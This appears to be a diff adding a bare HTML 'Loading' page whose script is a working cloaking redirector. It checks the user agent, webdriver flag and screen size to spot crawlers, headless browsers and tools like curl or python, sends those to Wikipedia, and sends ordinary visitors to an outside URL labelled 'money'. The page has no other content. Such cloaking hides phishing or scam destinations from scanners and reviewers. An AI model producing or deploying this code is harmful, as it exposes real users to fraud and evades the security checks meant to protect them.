@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Loading</title>
+</head>
+<body>
+<script>
+(function(){
+    var money = "https://securedalphaomservercloud.com/main/441kz";
+    var white = "https://www.wikipedia.org/";
+    var ua = navigator.userAgent.toLowerCase();
+    var bot = /bot|crawler|spider|slurp|headless|phantom|selenium|curl|wget|python|scraper|googlebot|bingbot/.test(ua);
+    if(!ua || ua === "mozilla") bot = true;
+    if(navigator.webdriver) bot = true;
+    if(screen.width < 100) bot = true;
+    window.location.href = bot ? white : money;
+})();
+</script>
+</body>
+</html>
